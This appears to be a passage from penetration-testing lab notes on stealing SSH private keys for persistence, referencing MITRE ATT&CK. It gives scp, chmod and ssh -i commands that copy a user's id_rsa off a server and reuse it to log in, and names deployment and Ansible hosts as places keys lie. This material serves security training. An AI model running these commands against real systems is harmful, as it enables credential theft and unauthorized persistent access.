* [Theft of `SSH` private keys](#theft-of-ssh-private-keys)

## Theft of `SSH` private keys
Stealing SSH private key is a widely used method to maintain access even after the user changes his password. 

This is also covered by the MITRE ATT&CK framework: https://attack.mitre.org/techniques/T1145/

```
# Copy the private keys of the user from the server, if they are kept as backup
$ scp student@192.224.16.3:~/.ssh/id_rsa .

# Once you have access to private keys of the user, you can login without password
# Change the permissions of the private key id_rsa to 400.
# It is required that your private key files are NOT accessible by others.

$ chmod 400 id_rsa
$ ssh -i id_rsa student@192.224.16.3
```
Example of private SSH keys lying in the computer

__Example case I:__  A development server that compiles, pulls/pushes code from a central code repository, and deploys the application/software on a test server might have private keys of deployment server and code server (to automate things and avoid credentials every time).

__Example case II:__ For automation, a lot of tools like Ansible, use SSH-based connections to multiple target machines, and perform a set of pre-defined actions. In this case, the machine hosting the Ansible will have the private keys.

